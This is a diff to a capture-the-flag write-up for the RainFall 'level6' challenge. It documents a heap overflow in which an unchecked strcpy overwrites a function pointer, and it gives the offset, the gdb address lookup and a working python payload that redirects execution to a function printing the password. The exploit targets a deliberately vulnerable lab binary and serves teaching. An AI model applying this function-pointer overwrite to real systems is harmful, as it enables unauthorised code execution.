@@ -2,9 +2,39 @@
 
 ## Analysis
 
+**In `main()`:**
+
+```c
+// Malloc of a String of length 64
+str = (char *)malloc(0x40); // 64
+// And just afterward, a malloc for a pointer to function
+fct = (void **)malloc(0x4);
+
+// pointer to function `m()` assigned
+fct = &m;
+// Unprotected `strcpy`
+strcpy(str, av[1]);
+
+// Call to the pointer to function which by default is `m()`
+fct();
+```
+
+**In `m()`:**
+
+Nothing interesting
+
+**In `n()`:**
+
+System call to print the `.pass`
+
+___
 
 ## Exploit
 
+If we change the pointer to function from `m()` adress -> `n()` adress using the `strcpy()`,
+That'll do it
+
+First lets determine the Offset :
 ```
  ❯ python3 offset.py
 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
@@ -18,6 +48,7 @@ Program received signal SIGSEGV, Segmentation fault.
 72
 ```
 
+What's the adress to `n()` ?
 ```
 (gdb) info function
 All defined functions:
@@ -28,16 +59,9 @@ All defined functions:
 ...
 ```
 
-```
-level6@RainFall:~$ ltrace ./level6 42
-__libc_start_main(0x804847c, 2, 0xbffff7f4, 0x80484e0, 0x8048550 <unfinished ...>
-malloc(64)                                                                                = 0x0804a008
-malloc(4)                                                                                 = 0x0804a050
-strcpy(0x0804a008, "42")                                                                  = 0x0804a008
-puts("Nope"Nope
-)                                                                              = 5
-+++ exited (status 5) +++
-```
+So the solution is:
+ * (72) Offset of 72 characters
+ * (04) Adress of `n()`
 
 ```
 level6@RainFall:~$ ./level6 $(python -c 'print "\x90" * 72 + "\x54\x84\x04\x08"')
